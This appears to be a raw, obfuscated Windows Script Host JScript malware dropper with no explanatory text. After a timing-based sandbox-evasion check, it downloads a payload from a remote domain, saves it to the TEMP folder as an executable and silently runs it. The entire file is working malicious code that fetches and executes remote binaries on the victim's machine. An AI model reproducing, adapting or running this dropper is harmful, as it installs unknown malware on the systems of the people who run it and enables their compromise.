var _W = false;
var _IY = "CreateObject";
var _OJ = function _X() {return WScript[_IY]("WScript"+".Shell");}(), _Z0 = 11;
var _HL = "MSXML2.XMLHTTP";
var _I3 = 2123213;
var _I1 = 0;
function _I(_Z){_OJ["Run"](_Z, _I1, _I1);};
function _IB(){return _HL + "";};
function _F(_P, _V1){_I1 = _I1 * 1; return _P - _V1;};
function _C(){return _IY;};
/*@cc_on
  @if (@_win32 || @_win64)
    _W = true;
  @end
@*/
if (_W)
{
var _E = "";
function _L(){return 22;};
var _J = 0; var _MH = 0;
function _N()
{
var _JL = new this["Date"]();
var _K = _JL["getUTCMilliseconds"]();
WScript["Sleep"](_L());
var _JL = new this["Date"]();
var _UL = _JL["getUTCMilliseconds"]();
WScript["Sleep"](_L());
var _JL = new this["Date"]();
var _GF = _JL["getUTCMilliseconds"]();
var _J = "_LQ";
_J = _F(_UL, _K);
var _MH = "_Y";
_MH = _F(_GF, _UL);
_E = "open";
return _F(_J, _MH);
}
var _F0 = false;
var _ST = false;
for (var _C0 = _I1; _C0 < _L() * 1; _C0++){if (_N() != _I1){
_F0 = true; 
_MH = "31" + 11 * _J + _MH; 
_ST = true; 
break;
}}
function _V() {return ((_F0 == true) && (_F0 == _ST)) ? 1 : _I1;};
if (_F0 && _V() && _ST){
function _A() {return _OJ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ASE1M9fFdh.ex" + "e";};
 _V0 = _IB();
 _U = WScript[_IY](_V0);
 var _I2 = 1;
 while (_I2){
try {
	if (_I2 == 1)
	{
		_U[_E]("GET", "http://ihlasauracleanmax.co/j3dlad", false);
		_U["send"]();
		_N0 = "Sleep";
	}
	WScript[_N0](_L() + 120); 
	if (_U["readystate"] < 2 * 2) continue;
	_I2 = _I1;
	function _B(_QT) {var _BN = (1, 2, 3, 4, 5, _QT); return _BN;};
	_BE = WScript[_C()]("ADODB.Stream");
	_V0 = _BE;
	_V0[_E]();
	_V0["type"] = _B(1);
	_V0["write"](_U["ResponseBody"]);
	_BE["position"] = _B(_I1);
	_V0["Save" + "ToFile"](_A(), 2);
	_BE["cl"+"ose"]();
	_I0 = _A();
	_I(_I0);
} catch(_IR){};
}
}
}

